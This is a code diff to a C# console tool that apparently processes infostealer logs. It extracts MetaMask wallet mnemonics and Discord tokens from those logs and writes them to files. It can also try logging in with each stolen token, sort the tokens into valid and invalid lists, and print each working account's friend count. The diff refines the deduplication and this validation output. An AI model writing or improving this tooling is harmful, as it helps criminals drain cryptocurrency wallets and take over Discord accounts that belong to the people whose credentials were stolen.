@@ -27,7 +27,7 @@ public class MainView : ArgsView
             Mode = FileMode.OpenOrCreate,
         });
         
-        foreach (var wallet in new MetamaskParser().ByLogs(_config.Path))
+        foreach (var wallet in new MetamaskParser().ByLogs(_config.Path).DistinctBy(x => x?.Mnemonic))
         {
             if (wallet?.Mnemonic is null) continue;
             
@@ -53,7 +53,6 @@ public class MainView : ArgsView
             Access = FileAccess.Write,
             Mode = FileMode.OpenOrCreate,
         };
-        var parser = new DiscordParser();
         var checker = new DiscordChecker();
         
         System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies
@@ -67,20 +66,22 @@ public class MainView : ArgsView
             invalid = new StreamWriter("Discord/invalid.txt", options);
             valid = new StreamWriter("Discord/valid.txt", options);
         }
-        
-        foreach (var token in parser.ByLogs(_config.Path).Distinct())
+
+        foreach (var token in new DiscordParser().ByLogs(_config.Path).Distinct())
         {
-            System.Console.WriteLine(token);
             all.WriteLine(token);
-            
+
             if (!check) continue;
 
-            if (checker.TryLogin(token) is not null)
+            if (checker.TryLogin(token) is {} account)
+            {
+                System.Console.WriteLine($"Token: {token}\nFriends: {checker.Friends(account)?.Count() ?? 0}");
                 valid!.WriteLine(token);
+            }
             else
                 invalid!.WriteLine(token);
         }
-        
+
         all.Dispose();
         invalid?.Dispose();
         valid?.Dispose();
